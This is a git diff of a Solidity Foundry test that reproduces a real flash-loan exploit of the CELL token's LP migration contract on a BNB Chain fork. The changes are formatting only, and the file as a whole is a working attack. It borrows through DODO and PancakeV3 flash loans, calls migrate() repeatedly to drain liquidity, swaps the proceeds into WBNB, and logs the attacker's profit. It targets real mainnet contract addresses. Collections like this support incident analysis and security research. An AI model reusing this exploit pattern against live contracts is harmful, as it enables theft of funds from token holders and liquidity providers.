@@ -13,12 +13,7 @@ import "./interface.sol";
 // @Analysis - https://twitter.com/numencyber/status/1664132985883615235?cxt=HHwWhoDTqceImJguAAAA
 
 interface IPancakeV3Pool {
-    function flash(
-        address recipient,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
+    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
 }
 
 interface IPancakeRouterV3 {
@@ -32,9 +27,7 @@ interface IPancakeRouterV3 {
         uint160 sqrtPriceLimitX96;
     }
 
-    function exactInputSingle(
-        ExactInputSingleParams memory params
-    ) external payable returns (uint256 amountOut);
+    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
 }
 
 interface ILpMigration {
@@ -42,19 +35,13 @@ interface ILpMigration {
 }
 
 contract ContractTest is Test {
-    IDPPOracle DPPOracle =
-        IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    IPancakeV3Pool PancakePool =
-        IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
-    Uni_Router_V2 Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
+    IPancakeV3Pool PancakePool = IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
+    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     Uni_Pair_V2 CELL9 = Uni_Pair_V2(0x06155034f71811fe0D6568eA8bdF6EC12d04Bed2);
-    IPancakePair PancakeLP =
-        IPancakePair(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
-    ILpMigration LpMigration =
-        ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
-    IPancakeRouterV3 SmartRouter =
-        IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
+    IPancakePair PancakeLP = IPancakePair(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
+    ILpMigration LpMigration = ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
+    IPancakeRouterV3 SmartRouter = IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 oldCELL = IERC20(0xf3E1449DDB6b218dA2C9463D4594CEccC8934346);
     IERC20 newCELL = IERC20(0xd98438889Ae7364c7E2A3540547Fad042FB24642);
@@ -63,7 +50,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28708273);
+        cheats.createSelectFork("bsc", 28_708_273);
         cheats.label(address(DPPOracle), "DPPOracle");
         cheats.label(address(PancakePool), "PancakePool");
         cheats.label(address(Router), "Router");
@@ -81,26 +68,16 @@ contract ContractTest is Test {
     function testExploit() public {
         deal(address(WBNB), address(this), 0.1 ether);
         emit log_named_decimal_uint(
-            "Attacker WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
-        );
+            "Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
+            );
 
         // Preparation. Pre-attack transaction
         WBNB.approve(address(Router), type(uint256).max);
-        swapTokens(
-            address(WBNB),
-            address(oldCELL),
-            WBNB.balanceOf(address(this))
-        );
+        swapTokens(address(WBNB), address(oldCELL), WBNB.balanceOf(address(this)));
 
         oldCELL.approve(zap, type(uint256).max);
         oldCELL.approve(address(Router), type(uint256).max);
-        swapTokens(
-            address(oldCELL),
-            address(WBNB),
-            oldCELL.balanceOf(address(this)) / 2
-        );
+        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)) / 2);
 
         Router.addLiquidity(
             address(oldCELL),
@@ -114,53 +91,31 @@ contract ContractTest is Test {
         );
 
         // End of preparation. Attack start
-        DPPOracle.flashLoan(1_000 * 1e18, 0, address(this), new bytes(1));
+        DPPOracle.flashLoan(1000 * 1e18, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
-            "Attacker WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
-        );
+            "Attacker WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
+            );
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         PancakePool.flash(
-            address(this),
-            0,
-            500_000 * 1e18,
-            hex"0000000000000000000000000000000000000000000069e10de76676d0800000"
+            address(this), 0, 500_000 * 1e18, hex"0000000000000000000000000000000000000000000069e10de76676d0800000"
         );
         newCELL.approve(address(SmartRouter), type(uint256).max);
         smartRouterSwap();
 
-        swapTokens(
-            address(newCELL),
-            address(WBNB),
-            94_191_714_329_478_648_796_861
-        );
+        swapTokens(address(newCELL), address(WBNB), 94_191_714_329_478_648_796_861);
 
-        swapTokens(
-            address(newCELL),
-            address(BUSD),
-            newCELL.balanceOf(address(this))
-        );
+        swapTokens(address(newCELL), address(BUSD), newCELL.balanceOf(address(this)));
 
         BUSD.approve(address(Router), type(uint256).max);
         swapTokens(address(BUSD), address(WBNB), BUSD.balanceOf(address(this)));
 
-        WBNB.transfer(address(DPPOracle), 1_000 * 1e18);
+        WBNB.transfer(address(DPPOracle), 1000 * 1e18);
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         newCELL.approve(address(Router), type(uint256).max);
         CELL9.approve(address(LpMigration), type(uint256).max);
 
@@ -170,32 +125,18 @@ contract ContractTest is Test {
 
         // Liquidity amount to migrate (for one call to migrate() func)
         uint256 lpAmount = CELL9.balanceOf(address(this)) / 10;
-        emit log_named_uint(
-            "Amount of liquidity to migrate (for one migrate call)",
-            lpAmount
-        );
+        emit log_named_uint("Amount of liquidity to migrate (for one migrate call)", lpAmount);
 
         // 8 calls to migrate were successfull. Ninth - revert in attack tx.
         for (uint256 i; i < 9; ++i) {
             LpMigration.migrate(lpAmount);
         }
 
-        PancakeLP.transfer(
-            address(PancakeLP),
-            PancakeLP.balanceOf(address(this))
-        );
+        PancakeLP.transfer(address(PancakeLP), PancakeLP.balanceOf(address(this)));
         PancakeLP.burn(address(this));
 
-        swapTokens(
-            address(WBNB),
-            address(newCELL),
-            WBNB.balanceOf(address(this))
-        );
-        swapTokens(
-            address(oldCELL),
-            address(WBNB),
-            oldCELL.balanceOf(address(this))
-        );
+        swapTokens(address(WBNB), address(newCELL), WBNB.balanceOf(address(this)));
+        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)));
 
         newCELL.transfer(address(PancakePool), 500_000 * 1e18 + fee1);
     }
@@ -206,26 +147,21 @@ contract ContractTest is Test {
         path[0] = from;
         path[1] = to;
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            address(this),
-            block.timestamp + 100
+            amountIn, 0, path, address(this), block.timestamp + 100
         );
     }
 
     // Helper function for swap tokens with the use Pancake RouterV3
     function smartRouterSwap() internal {
-        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3
-            .ExactInputSingleParams({
-                tokenIn: address(newCELL),
-                tokenOut: address(WBNB),
-                fee: 500,
-                recipient: address(this),
-                amountIn: 768_165_437_250_117_135_819_067,
-                amountOutMinimum: 0,
-                sqrtPriceLimitX96: 0
-            });
+        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3.ExactInputSingleParams({
+            tokenIn: address(newCELL),
+            tokenOut: address(WBNB),
+            fee: 500,
+            recipient: address(this),
+            amountIn: 768_165_437_250_117_135_819_067,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
         SmartRouter.exactInputSingle(params);
     }
 
